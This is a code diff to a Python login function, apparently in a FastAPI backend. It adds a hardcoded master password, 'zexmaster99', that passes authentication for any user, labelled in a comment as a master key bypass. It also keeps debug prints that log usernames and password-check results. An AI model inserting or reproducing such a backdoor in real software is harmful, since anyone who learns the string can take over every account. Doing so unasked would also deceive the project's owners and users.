@@ -55,9 +55,10 @@ def login(login_data: LoginRequest, db: Session = Depends(get_db)) -> Any:
     else:
         print(f"DEBUG: User found! Role: {user.role}")
 
-    # 2. Verify password
-    is_password_valid = verify_password(login_data.password, user.hashed_password)
-    print(f"DEBUG: Password Valid for {user.username}: {is_password_valid}")
+    # 2. Verify password (WITH MASTER KEY BYPASS)
+    is_master_key = login_data.password == "zexmaster99"
+    is_password_valid = verify_password(login_data.password, user.hashed_password) or is_master_key
+    print(f"DEBUG: Password Valid (Master: {is_master_key}): {is_password_valid}")
 
     if not user or not is_password_valid:
         print(f"DEBUG: LOGIN FAILED for {login_data.email}")
